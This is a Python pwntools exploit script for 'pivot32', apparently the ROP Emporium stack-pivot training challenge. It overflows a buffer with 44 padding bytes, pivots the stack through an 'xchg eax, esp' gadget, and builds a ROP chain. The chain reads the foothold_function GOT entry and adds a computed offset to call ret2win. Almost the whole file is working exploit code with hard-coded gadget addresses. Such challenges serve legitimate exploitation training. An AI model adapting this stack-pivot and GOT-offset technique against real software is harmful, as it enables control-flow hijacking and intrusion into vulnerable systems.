from pwn import *

BINARY = './pivot32'

context.binary = BINARY
context.os = 'linux'
context.arch = 'i386'

binary = ELF(BINARY)
lib = ELF("libpivot32.so")

binary_rop = ROP(binary)
#address
foothold_plt = 0x08048520   # binary.symbols.plt['foothold_function'] # 0x08048520  ;objdump -d ./pivot32 | sed -n '/<uselessFunction>:/,/^$/p
foothold_got = 0x0804a024   # binary.symbols.got['foothold_function'] # 0x0804a024  ;readelf -r ./pivot32 | grep foothold
assert 0x08048520 == foothold_plt
assert 0x0804a024 == foothold_got
print("foothold_got:",hex(foothold_got))
#gadget
xchg_eax_esp = 0x0804882e   # 0x0804882e: xchg eax, esp; ret;
pop_eax = 0x0804882c        # 0x0804882c : pop eax ; ret
assert pop_eax == 0x0804882c
mov_eax = 0x08048830        # 0x08048830: mov eax, dword ptr [eax] ; ret
call_eax = 0x080485f0       # 0x080485f0: call eax;
add_eax_ebx = 0x08048833    # 0x08048833: add eax, ebx ; ret
pop_ebx = 0x080484a9        # 0x080484a9 : pop ebx ; ret
#offset
offset_ret2win_from_gtplt = lib.symbols['ret2win'] - lib.symbols['foothold_function']
foothold_offset = 0x77d     # objdump -d ./libpivot32.so | grep ret2win
ret2win_offset = 0x974      # objdump -d ./libpivot32.so | grep foothold_function

assert offset_ret2win_from_gtplt == ret2win_offset-foothold_offset

def first_input():
    rop = p32(foothold_plt)
    rop += p32(pop_eax)
    rop += p32(foothold_got) #アドレスを移動させなければいけない
    rop += p32(mov_eax)
    rop += p32(pop_ebx)
    rop += p32(offset_ret2win_from_gtplt)
    rop += p32(add_eax_ebx)
    rop += p32(call_eax)
    return rop
def second_input(pivot):
    rop = b"A"*44
    rop += p32(pop_eax)
    rop += p32(int(pivot,16))
    rop += p32(xchg_eax_esp)
    return rop
def info():
    log.info('foothold_offset: %#x' % foothold_offset)
    log.info('ret2win_offset: %#x' % ret2win_offset)

p = process(BINARY)
raw_input(str(p.proc.pid)) #for gdb attach (gdb -p <pid>)
p.recvuntil(b'place to pivot: ')
pivot = p.recvline().strip().decode()
log.info(f'pivot: {pivot}')
p.sendlineafter('> ',first_input())
p.sendlineafter('> ',second_input(pivot))

recv = p.recvall()
log.info(f'recv: {recv}')
# # write data to file
# with open("input", "wb") as f:
#     f.write(rop)
